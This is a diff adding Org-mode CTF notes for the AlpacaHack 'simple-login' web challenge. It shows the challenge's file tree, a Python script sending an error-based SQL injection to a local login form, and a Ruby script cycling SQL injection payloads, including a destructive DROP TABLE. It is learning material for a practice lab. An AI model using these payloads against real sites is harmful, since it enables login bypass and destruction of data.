@@ -1,0 +1,108 @@
+* AlpacaHack
+
+** TODO simple-login
+:PROPERTIES:
+:CATEGORY: web
+:END:
+
+- State "TODO"       from              [2025-07-06 Sun 02:12] \\
+  not yet
+  
+#+CAPTION: Directory Structure
+#+begin_example
+ .
+├──  compose.yaml
+├──  db
+│   └──  init.sql
+└──  web
+    ├──  app.py
+    ├──  Dockerfile
+    ├──  requirements.txt
+    └──  templates
+        ├──  index.html
+        └──  login.html
+#+end_example
+
+*** COMMENT Exploits
+
+#+begin_src python :tangle exploit.py
+  import requests
+  from urllib.parse import quote
+
+  url = "http://localhost:3000/login"
+  username_payload = "' OR 1/0 -- "
+  password_payload = "test"
+
+  encoded_username_payload = quote(username_payload)
+
+  data = {
+      "username": encoded_username_payload,
+      "password": password_payload
+  }
+
+  print("Attempting simple error-based injection (1/0)...")
+  response = requests.post(url, data=data, allow_redirects=False)
+
+  print(f"Status Code: {response.status_code}")
+  print("Headers:")
+  for header, value in response.headers.items():
+      print(f"  {header}: {value}")
+  print("\nBody:")
+  print(response.text)
+#+end_src
+
+#+RESULTS:
+
+#+begin_src ruby
+   require 'net/http'
+   require 'uri'
+
+   # Target application details
+   $host = 'localhost' # Replace with your Flask app's host
+   $port = 3000       # Replace with your Flask app's port
+   $login_path = '/login'
+
+   # Function to send a POST request to the login endpoint
+   def send_login_request(username, password)
+     uri = URI.parse("http://#$host:#$port#$login_path")
+     http = Net::HTTP.new(uri.host, uri.port)
+     request = Net::HTTP::Post.new(uri.request_uri)
+     request.set_form_data({'username' => username, 'password' => password})
+
+     begin
+       response = http.request(request)
+       puts "Request with username: '#{username}', password: '#{password}'"
+       puts "Status Code: #{response.code}"
+       puts "Body: #{response.body.inspect}"
+       puts "---"
+       return response
+     rescue Errno::ECONNREFUSED
+       puts "Error: Could not connect to the server at http://#{host}:#{port}"
+       exit(1)
+     end
+   end
+
+   # --- Test Payloads ---
+
+   # Simple SQL injection attempts
+   payloads = [
+     {"username" => "admin'--", "password" => "anything"},
+     {"username" => "admin", "password" => "' OR '1'='1'--"},
+     {"username" => "' OR 1=1 --", "password" => "anything"},
+     {"username" => "'; DROP TABLE users; --", "password" => "anything"}, # Be extremely careful with destructive payloads!
+     {"username" => "admin", "password" => "' UNION SELECT * FROM users --"}, # Might reveal data
+     {"username" => "admin", "password" => "` OR `1`=`1` --"}, # Using backticks
+     {"username" => "admin", "password" => "\" OR \"1\"=\"1\" --"}, # Using double quotes
+   ]
+
+   payloads.each do |payload|
+     send_login_request(payload["username"], payload["password"])
+   end
+
+   # Test with a valid username and a malicious password
+   send_login_request("testuser", "' OR '1'='1'--") # Replace 'testuser' if you know a valid one
+
+   # Test with a malicious username and a valid password
+   send_login_request("' OR '1'='1'--", "testpassword") # Replace 'testpassword' if you know a valid one
+#+end_src
+
